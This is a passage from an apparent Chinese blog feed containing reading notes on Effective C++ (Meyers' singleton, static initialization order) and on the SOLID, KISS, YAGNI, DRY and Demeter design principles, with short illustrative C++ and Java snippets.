2：客户建立一个Deirectory用来处理文件系统中的目录：</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">Directory</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-built_in">Directory</span>() {        std::<span class="hljs-type">size_t</span> disk = tfs.<span class="hljs-built_in">numDisks</span>();    }  ...};Directory tempDir;</code></pre></div></div><p>在上面这个例子中，你无法确保位于不同编译单元内的<code>tfs</code>一定在<code>tempDir</code>之前初始化完成。</p><p>这个问题的一个有效解决方案是采用 <strong>Meyers'singleton</strong>，将全局静态对象转化为局部静态对象：</p><blockquote><p>Meyers就是这本书的作者。这是它首创的(笑</p></blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-4zlnm8lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-4zlnm8lmso36dk"><pre><code class="hljs cpp"><span class="hljs-comment">// File 1</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">FileSystem</span>{ ... }   <span class="hljs-comment">//和前面一样</span><span class="hljs-function">FileSystem&amp; <span class="hljs-title">tfs</span><span class="hljs-params">()</span> </span>{    <span class="hljs-type">static</span> FileSystem fs;    <span class="hljs-keyword">return</span> fs;}<span class="hljs-comment">//这个函数用来替换tfs对象;它在 FileSystem class中可能是个static, 定义并初始化一个local static对象, 返回一个reference指向上述对象。</span><span class="hljs-comment">//File 2</span><span class="hljs-function"><span class="hljs-keyword">class</span> <span class="hljs-title">Directory</span><span class="hljs-params">()</span></span>{<span class="hljs-built_in">Directory</span>(){    std::<span class="hljs-type">size_t</span> disks=<span class="hljs-built_in">tfs</span>().<span class="hljs-built_in">numDisks</span>();  }  ...    }<span class="hljs-function">Directory&amp; <span class="hljs-title">tempDir</span><span class="hljs-params">()</span> </span>{    <span class="hljs-type">static</span> Directory td;    <span class="hljs-keyword">return</span> td;}<span class="hljs-comment">//相应的，后面需要使用单例对象只需要调用tempDir()即可。</span></code></pre></div></div><p>这个手法的基础在于：C++保证，函数内的局部静态对象会在<strong>该函数被调用期间</strong>，<strong>首次遇上该对象之定义式</strong>时被初始化，也就是说顺便还实现了懒加载。也即不用这个函数，它之中的局部静态对象便不会被初始化。</p><blockquote><p>根据<a href="https://laristra.github.io/flecsi/src/developer-guide/patterns/meyers_singleton.html">这篇文章</a>，我们还可以对这种单例进行一下封装。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-hxkku2lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-hxkku2lmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-type">static</span> Singleton&amp; <span class="hljs-title">getInstance</span><span class="hljs-params">()</span> </span>{        <span class="hljs-type">static</span> Singleton instance; <span class="hljs-comment">// 静态局部变量，在首次访问时初始化</span>        <span class="hljs-keyword">return</span> instance;    }    <span class="hljs-comment">// 其他成员函数</span><span class="hljs-keyword">private</span>:    <span class="hljs-built_in">Singleton</span>() {} <span class="hljs-comment">// 私有构造函数，防止外部直接实例化</span>    <span class="hljs-built_in">Singleton</span>(<span class="hljs-type">const</span> Singleton&amp;) = <span class="hljs-keyword">delete</span>; <span class="hljs-comment">// 禁用拷贝构造函数(详见条款6)</span>    Singleton&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> Singleton&amp;) = <span class="hljs-keyword">delete</span>; <span class="hljs-comment">// 禁用赋值运算符</span>};</code></pre></div></div></blockquote><p>当然，这种做法对于多线程来说会有不确定性，最好还是在单线程启动阶段手动调用函数完成初始化。</p><blockquote><p>对于多线程的情形，原文是说不敢保证。事实上C++11已经可以保证了。在C++11标准中，要求局部静态变量初始化具有线程安全性。<a href="https://blog.csdn.net/imred/article/details/89069750">这篇文章</a>十分有深度，对这个问题进行了更细致的分析。因此在实际上我们可以使用Meyers'singleton方法创建线程安全的静态单例。</p><p>这一点可由下面的程序验证：</p><p>摘录一下标准关于局部静态变量初始化的要求：</p><ol type="1"><li><p>变量在代码第一次执行到变量声明的地方时初始化。</p></li><li><p>初始化过程中发生异常的话视为未完成初始化，未完成初始化的话，需要下次有代码执行到相同位置时再次初始化。</p></li><li><p>在当前线程执行到需要初始化变量的地方时，如果有其他线程正在初始化该变量，则阻塞当前线程，直到初始化完成为止。</p></li><li><p>如果初始化过程中发生了对初始化的递归调用，则视为未定义行为。</p></li></ol><p>关于第四点，怎么会有人写这样的代码。。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-nm7t6klmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-nm7t6klmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Bar</span>{<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-type">static</span> Bar *<span class="hljs-title">getInstance</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>{        <span class="hljs-type">static</span> Bar s_instance;        <span class="hljs-keyword">return</span> &amp;s_instance;    }<span class="hljs-keyword">private</span>:    <span class="hljs-built_in">Bar</span>()    {        <span class="hljs-built_in">getInstance</span>();    }};</code></pre></div></div></blockquote>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>EffectiveC++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>设计模式之美-设计原则</title>
    <link href="/posts/27697/"/>
    <url>/posts/27697/</url>
    
    <content type="html"><![CDATA[<h1 id="设计模式之美-设计原则">设计模式之美-设计原则</h1><h2 id="大纲">大纲</h2><p>写在前面：这是王争的《设计模式之美》阅读笔记，原文发表在<a href="https://time.geekbang.org/column/intro/100039001">极客时间</a>，也有纸质书版本。阅读完整内容可购买正版支持。</p><p>设计模式或许显得有些“屠龙技”，但有了这些思想，能让我们站在更高的视角去看软件开发，而不是迷失在框架的细节里。</p><p>这一部分主要对“设计原则与思想：设计原则”部分进行总结。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E7%BE%8E-%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/20230917201433246099_532_image-20230911163224132.png" alt="image-20230911163224132"><figcaption aria-hidden="true">image-20230911163224132</figcaption></figure><p>上图的缩写全称对应如下：</p><p>单一职责原则（Single Responsibility Principle）</p><p>开闭原则（Open Closed Principle）</p><p>里氏替换原则（Liskov Substitution Principle）</p><p>接口隔离原则（Interface Segregation Principle）</p><p>依赖倒置原则（Dependence Inversion Principle）</p><p>KISS （Keep It Simple and Stupid）</p><p>YAGNI（You Ain’t Gonna Need It）</p><p>DRY（Don’t Repeat Yourself）</p><p>LOD迪米特法则（Law of Demeter）</p><h2 id="设计原则">设计原则</h2><h3 id="单一职责原则">单一职责原则</h3><h5 id="如何理解单一职责原则srp">如何理解单一职责原则（SRP）？</h5><p>一个类只负责完成一个职责或者功能。不要设计大而全的类，要设计粒度小、功能单一的类。单一职责原则是为了实现代码高内聚、低耦合，提高代码的复用性、可读性、可维护性。</p><h5 id="如何判断类的职责是否足够单一">如何判断类的职责是否足够单一？</h5><p>不同的应用场景、不同阶段的需求背景、不同的业务层面，对同一个类的职责是否单一，可能会有不同的判定结果。实际上，一些侧面的判断指标更具有指导意义和可执行性，比如，出现下面这些情况就有可能说明这类的设计不满足单一职责原则：</p><ul><li>类中的代码行数、函数或者属性过多；</li><li>类依赖的其他类过多，或者依赖类的其他类过多；</li><li>私有方法过多；比较难给类起一个合适的名字；</li><li>类中大量的方法都是集中操作类中的某几个属性。</li></ul><h5 id="类的职责是否设计得越单一越好">类的职责是否设计得越单一越好？</h5><p>单一职责原则通过避免设计大而全的类，避免将不相关的功能耦合在一起，来提高类的内聚性。同时，类职责单一，类依赖的和被依赖的其他类也会变少，减少了代码的耦合性，以此来实现代码的高内聚、低耦合。但是，如果拆分得过细，实际上会适得其反，反倒会降低内聚性，也会影响代码的可维护性。</p><blockquote><p>举例，一些“配套使用”的组件，例如序列化和反序列化，若后续有修改优化的可能，应当组合起来，即便没有，组合起来也有助于让使用者意识到其应当配套使用，而不会与其他序列化反序列化组件混用。</p></blockquote><h3 id="对扩展开放对修改封闭">对扩展开放，对修改封闭</h3><h5 id="如何理解对扩展开放对修改关闭">如何理解“对扩展开放、对修改关闭？</h5><p>本身的定义是：添加一个新的功能，应该是通过在已有代码基础上扩展代码（新增模块、类、方法、属性等），而非修改已有代码（修改模块、类、方法、属性等）的方式来完成。</p><p>实际上我们要添加或者修改功能，不可能不改已有代码。但是我们不应当修改面向用户或者说面向测试用例的代码，而是在不改变整体架构的基础上，通过“注册”的方式去灵活的插入到扩展点上。</p><blockquote><p>原文举了一个API告警的例子。我们需要调用<code>check</code>函数去检查并发起告警。也就是它是面向用户的。这时候对于它的设计就需要意识到：</p><p>我们不应该将业务逻辑耦合到<code>check()</code>中，其入参也不应该与具体check的内容耦合，否则我们添加或改变预警的指标或逻辑时，便不可避免的修改接口。</p><p>比较好的思路是传入<code>ApiStatInfo</code>，向<code>check()</code>函数对应的接口对象注册检查方法。</p><p>更具体一些：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-cvq1b8lmrh9u6a"></i><span>java</span><div class="collapse show" id="collapse-cvq1b8lmrh9u6a"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Alert</span> {    <span class="hljs-keyword">private</span> List&lt;AlertHandler&gt; alertHandlers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addAlertHandler</span><span class="hljs-params">(AlertHandler alertHandler)</span> {        <span class="hljs-built_in">this</span>.alertHandlers.add(alertHandler);    }    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">check</span><span class="hljs-params">(ApiStatInfo apiStatInfo)</span> {        <span class="hljs-keyword">for</span> (AlertHandler handler : alertHandlers) {            handler.check(apiStatInfo);        }    }}</code></pre></div></div><p>这样需要添加或修改业务逻辑时，比起将其耦合在<code>check</code>中，可能修改的位置变多了，比如需要修改<code>AlertHandler</code>，可能需要修改<code>ApiStatInfo</code>。但是这样设计如果要多次修改，可以降低心智负担，如果那个模块出问题了，也容易通过调用栈定位到问题，而不是定位到<code>check</code>函数的某一行，哪里出问题了还要继续翻看。</p><p>因为修改的地方变多了，我们也可能需要辅以文档说明当我们需要修改逻辑时要改哪些部分，防止出现逻辑上不一致的问题。这一点是作者没有提到的。</p><p>更容易理解的，我们可以建立一个<code>webserver</code>的心智模型，典型的比如<code>golang</code>的<code>net/http</code>。我们的<code>serve()</code>方法应当是向多路复用器去注册方法，并且将<code>http</code>的请求和响应封装起来。</p></blockquote><h5 id="如何做到对扩展开放修改关闭">如何做到“对扩展开放、修改关闭”？</h5><p>我们要时刻具备扩展意识、抽象意识、封装意识。在写代码的时候，我们要多花点时间思考一下，这段代码未来可能有哪些需求变更，如何设计代码结构，事先留好扩展点，以便在未来需求变更的时候，在不改动代码整体结构、做到最小代码改动的情况下，将新的代码灵活地插入到扩展点上。</p><p>同时这条设计原则也是十分重要的。<strong>大部分设计模式都是为了解决代码的扩展性问题而存在的</strong>。最常用来提高代码扩展性的方法有：多态、依赖注入、基于接口而非实现编程，以及大部分的设计模式（比如，装饰、策略、模板、职责链、状态）。</p><h3 id="里氏替换原则">里氏替换原则</h3><h5 id="如何理解">如何理解</h5><p>定义：子类对象（object of subtype/derivedclass）能够替换程序（program）中父类对象（object of base/parentclass）出现的任何地方，并且保证原来程序的逻辑行为（behavior）不变及正确性不被破坏。</p><p>或者换一些表述：</p><p>子类确保按照is-a的关系继承父类</p><p><strong>子类不应当违背父类的约定</strong></p><blockquote><p>通常来说，这个原则是不太容易被违背的，只要心里有这个意识。</p><p>比如：父类<code>Transporter</code>用来传输网络数据，子类<code>SecurityTransporter</code>用来安全的传输网络数据，支持传输appId 和 appToken 安全认证信息。</p><p>这时候，如果 appId 或者 appToken 没有设置，我们应该怎么做？</p><p>如果要保持这种继承(或者硕可替代)关系，我们就应该什么也不做，而不是抛异常。</p><p>另外一个例子，正方形继承自长方形，合理吗？或许长方形有的属性，正方形也有，但对长方形的<code>resize</code>操作，显然不一定对正方形合法，所以在这种情况下不应当成为严格的继承关系。</p></blockquote><h5 id="怎么做">怎么做</h5><p>“Design ByContract”，中文翻译就是“按照协议来设计”。子类要遵守父类的约定。</p><p>具体的：</p><ul><li>子类不应违背父类声明要实现的功能</li><li>子类不应违背父类对输入、输出、异常的约定</li><li>子类不应违背父类注释中所罗列的任何特殊说明</li></ul><blockquote><p>对于最后一条，作者举了个例子，和上面长方形正方形很像：</p><p>父类中定义的 <code>withdraw()</code>提现函数的注释是这么写的：“用户的提现金额不得超过账户余额……”，而子类重写<code>withdraw()</code> 函数之后，针对 VIP账号实现了透支提现的功能，也就是提现金额可以大于账户余额，那这个子类的设计也是不符合里式替换原则的。</p></blockquote><h3 id="接口隔离原则">接口隔离原则</h3><h5 id="如何理解-1">如何理解</h5><p>定义：“Clients should not be forced to depend upon interfaces thatthey do notuse。”直译成中文的话就是：客户端不应该强迫依赖它不需要的接口。其中的“客户端”，可以理解为接口的调用者或者使用者。</p><p>接口隔离原则和单一职责原则其实很像。只是单一职责原则针对的是模块、类、接口的设计。接口隔离原则相对于单一职责原则，一方面更侧重于接口的设计，另一方面它的思考角度也是不同的。接口隔离原则提供了一种判断接口的职责是否单一的<strong>标准</strong>：<strong>通过调用者如何使用接口来间接地判定</strong>。如果调用者只使用部分接口或接口的部分功能，那接口的设计就不够职责单一。</p><h5 id="怎么做-1">怎么做</h5><p>其实接口隔离原则本身已经说的很清晰了。</p><p>下面给出作者的理解：</p><blockquote><p>如果把“接口”理解为一组接口集合，可以是某个微服务的接口，也可以是某个类库的接口等。如果部分接口只被部分调用者使用，我们就需要将这部分接口隔离出来，单独给这部分调用者使用，而不强迫其他调用者也依赖这部分不会被用到的接口。</p><p>如果把“接口”理解为单个 API接口或函数，部分调用者只需要函数中的部分功能，那我们就需要把函数拆分成粒度更细的多个函数，让调用者只依赖它需要的那个细粒度函数。</p><p>如果把“接口”理解为 OOP中的接口，也可以理解为面向对象编程语言中的接口语法。那接口的设计要尽量单一，不要让接口的实现类和调用者，依赖不需要的接口函数。</p></blockquote><p>总结一下的话，更具有实践意义的，当我们有需求通过在原有的类的基础上去除一些特性来实现新功能的话，就需要思考一下是否自己的设计有问题了。</p><blockquote><p>上面的意思，是说我们不应该耦合不必要的额外功能，而不是说不能用更通用的方法实现特定的问题。</p><p>假设我们需要设计一个线性回归的库函数(比如：<code>numpy.polyfit</code>)。</p><p>可能大多数情况下我们得到回归的参数都是要使用得到的拟合函数用新值去预测一个东西。但是这并不意味着我们设计的库函数接口就有义务做这件事，因为即便这样，并不是所有的用户都需要去预测，或许他们只是想拿到参数。我们没有义务为需要预测结果的用户做额外的事情。根据接口隔离原则，<strong>这个函数不应该提供这个功能。</strong></p><p>还有一个问题，这个函数返回拟合的残差来评价拟合效果，是否合理？我们知道，线性回归就是在最小化残差的平方和SSE（Sumof SquaredErrors），在计算过程中得到这个残差是理所当然的。但同样的，并不是所有用户都需要这个残差。因此，是否返回残差应该<strong>通过选项的方式提供</strong>。</p></blockquote><h3 id="依赖反转原则">依赖反转原则</h3><h5 id="如何理解-2">如何理解</h5><p>定义：High-level modules shouldn’t depend on low-level modules. Bothmodules should depend on abstractions. In addition, abstractionsshouldn’t depend on details. Details depend on abstractions.</p><p>高层模块（high-levelmodules）不要依赖低层模块（low-level）。高层模块和低层模块应该通过抽象（abstractions）来互相依赖。除此之外，抽象（abstractions）不要依赖具体实现细节（details），具体实现细节（details）依赖抽象（abstractions）。</p><p>换一种说法就是，<strong>面向接口编程，而不要面向实现编程</strong>。这一点在第一部分已经提及过了。</p><h5 id="怎么做-2">怎么做</h5><p>这个原则的名字很容易和当前流行的<strong>控制反转</strong>，<strong>依赖注入</strong>相混淆。我的理解是，虽然其含义有所不同，但目的是一样的。<strong>控制反转，依赖注入是对依赖反转的落实</strong>。</p><p>首先阐释一下什么是控制反转和依赖注入。Javaer可能已经不耐烦了。</p><p><strong>控制反转(Inversion OfControl)</strong>是指，程序的流程应该由框架控制，而不是由程序员控制。这一点乍一看很反直觉，我们程序员编程，不就是要控制流程吗，事实上是说，我们可以由自己写流程控制代码，转变为“告诉框架去怎么做”，这也是框架存在的意义。</p><p><strong>依赖注入(DependencyInjection)</strong>是一种编码技巧，也是控制反转的具体手段。我们应该将依赖的类对象在外部创建好之后，通过构造函数、函数参数等方式传递（或注入）给类使用，而不是把依赖的对象&lt;实例&gt;写死在方法类中。</p><p>至于框架，便是<strong>控制反转容器（Inversion Of ControlContainer）</strong>，它把我们需要对象“保存”起来，然后我们通过比如xml(Spring)或者注解(SpringBoot)的方式告诉框架怎样向方法类中去“注入"这些依赖，当需要用的时候就去向框架要。</p><p>为什么说控制反转，依赖注入是实现依赖反转的落实？当我们将依赖放到方法类内时，便很难避免方法类对依赖类实现的依赖，而通过依赖注入，至少方法类是通过依赖外部的接口使用依赖，用控制反转框架的时候，我们是去配置框架怎么去注入这些依赖，而当在业务相关的代码中实际使用到这个方法时，就只需要一个<code>getBean("name")</code>，而不用再关心它是怎么来的。这样上层的业务就只需要依赖方法类或者业务实例的接口，而不需要关心方法类或者业务实例的依赖是怎么处置的，当他们的依赖发生改变时，只需要改框架的配置即可。</p><h3 id="kiss-yagni">KISS &amp; YAGNI</h3><p>前面的SOLID原则从不同的维度介绍如何设计一个易于拓展易于维护的系统，各个方面都要求我们多去想怎么设计。这一部分更像是技术鸡汤和做事哲学，告诉我们在日常实际中如何去行事。</p><p>KISS 原则的英文描述有好几个版本，比如下面这几个。</p><p>Keep It Simple and Stupid.</p><p>Keep It Short and Simple.</p><p>Keep It Simple and Straightforward.</p><p>正如KISS法则本身表述的，我们无需关心其到底是表示的那一句话，只需要知道它想表达：<strong>尽量保持简单。</strong></p><blockquote><p>在南京大学的<a href="https://nju-projectn.github.io/ics-pa-gitbook/ics2022/1.5.html">计算机系统设计</a>中也提到了KISS法则：</p><p>唯一可以把你从bug的混沌中拯救出来的就是KISS法则,将其翻译为”不要在一开始追求绝对的完美“</p><p>换句话说，就是先完成，再做好。实际工作中也是如此。<a href="http://blog.sciencenet.cn/blog-414166-562616.html">这里</a>有一篇文章举出了很多的例子。</p><p>另一层意思是，<strong>从易到难, 逐步推进</strong>, 一次只做一件事,少做无关的事。做事不应畏手畏脚。系统复杂性越来越高，人的精力又是有限的，系统能跑起来才是王道,跑不起来什么都是浮云,追求面面俱到只会增加代码维护的难度。这一点看似与设计原则相悖。</p><p>因此，由此引申出来与之类似的<strong>YAGNI(You Ain’t Gonna Need It)原则</strong>，<strong>不要过度设计</strong>。这不是说我们不去设计，我们还是要根据前面的设计模式，去预留拓展点，只是当我们不需要的时候，就没必要去这么做，比如我们只需要完成一次性的功能，脚本就能实现；业务需求相对固定，等到需要的时候再去为拓展进行实现或重构。一样的，并不是应急处突它就不重要，而是说做事需要权衡利弊，比如我们业务马上就要上线，不能迷失在细节或未来里，而影响了当前目标的实现。</p></blockquote><p>上面是结合自身所学和经历进行的总结，下面继续来说作者是怎么讲的：</p><ul><li><p>不要使用同事可能不懂的技术来实现代码；</p></li><li><p>不要重复造轮子，要善于使用已经有的工具类库；</p></li><li><p>不要过度优化。</p></li></ul><blockquote><p>关于第二点，作者举了个验证IP地址的例子，并给出了三种实现：</p><p>第一种基于正则表达式，第二种用Java类库，第三种类似算法竞赛的代码，直接对字符进行处理。</p><p>实际开发中，第二种是最推荐的，第三种效率最高，但未必值得我们花费时间去做这样的优化，出了问题也难以维护。第一种正则本身效率就不高，正则引擎也是黑盒子，表达式本身也不太容易看懂，最不推荐。</p><p>这个例子很像手机号用宽松正则还是严格正则的<a href="https://www.zhihu.com/question/333400359">争论</a>，这时候简单的反而是扩展性高的，KISS法则和其他的设计模式并不矛盾。</p><p>当然并不意味着复杂的坏，作者举了个例子比如KMP算法，是很复杂，(比KMP更高效的更复杂)，但它解决的是字符串匹配的常见问题，因此是相当有价值的。这又涉及到性能优化的原则了。</p></blockquote><h3 id="dry原则">DRY原则</h3><p>定义：Don’t Repeat Yourself。</p><p>这里主要强调的，<strong>代码的重复和逻辑的重复不等同，我们需要避免的是逻辑的重复。</strong></p><blockquote><p>作者举了个例子，验证用户名和验证密码。<code>isValidUserName()</code>和<code>isValidPassword()</code>两个函数，虽然从代码实现逻辑上看起来是重复的，但是从语义上并不重复。所谓“语义不重复”指的是：从功能上来看，这两个函数干的是完全不重复的两件事情，一个是校验用户名，另一个是校验密码。尽管在目前的设计中，两个校验逻辑是完全一样的，但如果将两个函数的合并，虽然减少了代码冗余，但就会存在潜在的问题。在未来的某一天，如果我们修改了密码的校验逻辑，比如，允许密码包含大写字符，允许密码的长度为8 到 64 个字符，那这个时候，isValidUserName() 和 isValidPassword()的实现逻辑就会不相同。我们就要把合并后的函数，重新拆成合并前的那两个函数。可以看出，合并的代码<strong>违反了“单一职责原则”和“接口隔离原则”</strong></p><p>我们可以通过抽象成更细粒度函数的方式来部分的解决代码冗余。比如将校验只包含a<sub>z、0</sub>9、dot 的逻辑封装成<code>boolean onlyContains(String str, String charlist);</code>函数。</p><p>作者还举了个逻辑重复的例子：在同一个项目中，其中一个同事在不知道已经有了<code>isValidIp()</code> 的情况下，自己又定义并实现了同样 用来校验 IP地址是否合法的<code>checkIfIpValid()</code>函数。这种逻辑重复有可能会造成代码中有的地方调用了<code>isValidIp()</code>函数，有些地方又调用了 <code>checkIfIpValid()</code>函数，维护起来就会比较困难。可以看出，必要的注释、文档和团队的交流在多人开发中是十分必要的。</p></blockquote><h3 id="迪米特法则">迪米特法则</h3><p>Law of Demeter，缩写是 LOD。单从这个名字上来看，我们完全猜不出这个原则讲的是什么。不过，它还有另外一个更加达意的名字，叫作最小知识原则，英文翻译为：TheLeast Knowledge Principle。</p><p>关于这个设计原则，我们先来看一下它最原汁原味的英文定义：</p><blockquote><p>Each unit should have only limited knowledge about other units: onlyunits “closely” related to the current unit. Or: Each unit should onlytalk to its friends; Don’t talk to strangers.</p></blockquote><p>我们把它直译成中文，就是下面这个样子：</p><blockquote><p>每个模块（unit）只应该了解那些与它关系密切的模块（units: only units“closely” related to the currentunit）的有限知识（knowledge）。或者说，每个模块只和自己的朋友“说话”（talk），不和陌生人“说话”（talk）。</p></blockquote><p>这个法则的体现便是”高内聚，松耦合“。</p><p>所谓高内聚，就是指相近的功能应该放到同一个类中，不相近的功能不要放到同一类中。相近的功能往往会被同时修改，放到同一个类中，修改会比较集中。所谓松耦合指的是，在代码中，类与类之间的依赖关系简单清晰。即使两个类有依赖关系，一个类的代码改动也不会或者很少导致依赖类的代码改动。</p><h2 id="总结">总结</h2><p>在这一部分作者说，技术人也要有产品的思维。顾名思义，技术是”术“，设计原则则是”道“。最后，作者结合了简单的实例讲了通用框架开发的需求分析和设计。</p><p>虽然设计原则处处都充满了抽象，但对于系统设计来说，借鉴TDD（测试驱动开发）和Prototype（最小原型）的思想，先聚焦于一个简单的应用场景，基于此设计实现一个简单的原型更容易下手。</p><p>这就好比做算法题目。当我们想要一下子就想出一个最优解法时，可以先写几组测试数据，找找规律，再先想一个最简单的算法去解决它。虽然这个最简单的算法在时间、空间复杂度上可能都不令人满意，但是我们可以基于此来做优化，这样思路就会更加顺畅。</p><p>也不应该害怕重构，正如KISS原则所说，先完成，再做好。只是不能将追求仅仅停留在完成上，学习设计原则之于系统设计，就像数据结构和数学模型之于算法题目，在进行优化时能够有巨大的裨益。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>设计模式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>设计模式之美-面向对象</title>
    <link href="/posts/17442/"/>
    <url>/posts/17442/</url>
    
    <content type="html"><![CDATA[<h1 id="设计模式之美-面向对象">设计模式之美-面向对象</h1><h2 id="大纲">大纲</h2><p>写在前面：这是王争的《设计模式之美》阅读笔记，原文发表在<a href="https://time.geekbang.org/column/intro/100039001">极客时间</a>，也有纸质书版本。阅读完整内容可购买正版支持。</p><p>设计模式或许显得有些“屠龙技”，但有了这些思想，能让我们站在更高的视角去看软件开发，而不是迷失在框架的细节里。</p><p>这一部分主要对“设计原则与思想：面向对象”进行总结，从软件设计的角度重新认识面向对象。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E7%BE%8E-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/20230911163729034110_551_image-20230911102731242.png" alt="image-20230911102731242"><figcaption aria-hidden="true">image-20230911102731242</figcaption></figure><h2 id="面向对象">面向对象</h2><h3 id="面向对象四大特性">面向对象四大特性</h3><p>面向对象的四大特性：封装、抽象、继承、多态</p><p>尽管很呆，但小公司爱问</p><p><strong>封装：访问控制</strong></p><p>保护数据不被随意修改，提高代码的可维护性；另一方面是仅暴露有限的必要接口，提高类的易用性。</p><p><strong>抽象：面向接口</strong></p><p>让使用者只需要关心方法提供了哪些功能，不需要知道这些功能是如何实现的。以便有效地过滤掉不必要关注的信息，处理复杂的系统。</p><p><strong>继承和多态：代码复用</strong></p><p>只有当符合“isa"的模型，且更具体的，对父类的任何操作都应当对子类合法，才应当用继承。接口类和”鸭子类型“可以在保留多态的拓展性的同时避免继承造成的强耦合。关于这一部分后面会详细讨论。</p><blockquote><p>参见Effective C++ 条款32：确定你的public继承塑模出 is-a 关系。</p><p>如果某个函数可施行于某class身上，一定也可施行于其derivedclasses身上。</p></blockquote><h3 id="面向对象vs面向过程">面向对象vs面向过程</h3><p>在实际的面向对象编程中也很难逃出面向过程的编程范式。比如：</p><p><strong>滥用 getter、setter 方法会破坏类的封装。</strong></p><p>用IDE自动生成或者Lombok一把梭确实很省时间，但是有时候也违背了使用getter，setter的初衷，比如无意中引入不应当出现的setter。</p><p><strong>滥用全局变量和全局方法会影响代码的可维护性，增加代码的编译时间。</strong></p><p>原因是把全局变量集中在一起(比如创建一个Constant类)，一旦由于业务需求对其进行增加或修改，依赖它的代码都会受到影响。</p><p>对于全局或静态方法，如果极端一点就像C语言中的宏，</p><p><strong>如何避免</strong></p><p>在设计实现类的时候，除非真的需要，否则尽量不要给属性定义 setter方法。除此之外，尽管 getter 方法相对 setter方法要安全些，但是如果返回的是集合容器，那也要防范集合内部数据被修改的风险。</p><p>设计Constants 类、Utils类时，我们尽量能做到职责单一，定义一些细化的小类，比如RedisConstants、FileUtils，而不是定义一个大而全的 Constants 类、Utils类。除此之外，如果能将这些类中的属性和方法，划分归并到其他业务类中，那是最好不过的了，能极大地提高类的内聚性和代码的可复用性。</p><h3 id="接口抽象类">接口&amp;抽象类</h3><p>抽象类是对成员变量和方法的抽象，是一种 is-a关系，是为了解决代码复用问题。接口仅仅是对方法的抽象，是一种 has-a关系，表示具有某一组行为特性，是为了解决解耦问题，隔离接口和具体的实现，提高代码的扩展性。</p><blockquote><p>在C++中，一个所有方法都是纯虚函数，没有数据成员的抽象类显然可以看做是接口。</p><details><summary>对C++虚函数和接口实现关系的详细讨论</summary><blockquote><p>参见Effective C++ 条款34：区分接口继承和实现继承。</p><p>接口继承和实现继承不一样。在public继承下，派生类总是继承基类的接口。</p><p>声明一个纯虚函数的目的，是为了让派生类只继承函数接口。</p><blockquote><p>如一个Shape类的Draw()方法。</p></blockquote><p>声明简朴的非纯虚函数的目的，是让派生类继承该函数的接口和缺省实现。</p><blockquote><p>如一个Person类的Sleep()方法。</p></blockquote><p>声明非虚函数的目的，是为了令派生类继承函数的接口及一份强制性实现。</p><blockquote><p>如一个继承体系中的getObjectID()方法。</p></blockquote><p>同时，纯虚函数是可以提供具体实现的，并且用于替代简朴的非纯虚函数，提供更平常更安全的缺省实现。</p><p>用非纯虚函数提供缺省的默认实现：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xyxl91lmrh9u6a"></i><span>cpp</span><div class="collapse show" id="collapse-xyxl91lmrh9u6a"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Airplane</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Fly</span><span class="hljs-params">()</span> </span>{        <span class="hljs-comment">// 缺省实现</span>    }};<span class="hljs-keyword">class</span> <span class="hljs-title class_">Model</span> : <span class="hljs-keyword">public</span> Airplane { ... };</code></pre></div></div><p>这是最简朴的做法，但是这样做会带来的问题是，由于不强制对虚函数的覆写，在定义新的派生类时可能会忘记进行覆写，导致错误地使用了缺省实现。</p><p>使用纯虚函数并提供默认实现：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ziqhktlmrh9u6a"></i><span>C++</span><div class="collapse show" id="collapse-ziqhktlmrh9u6a"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Airplane</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Fly</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;};<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Airplane::Fly</span><span class="hljs-params">()</span> </span>{        <span class="hljs-comment">// 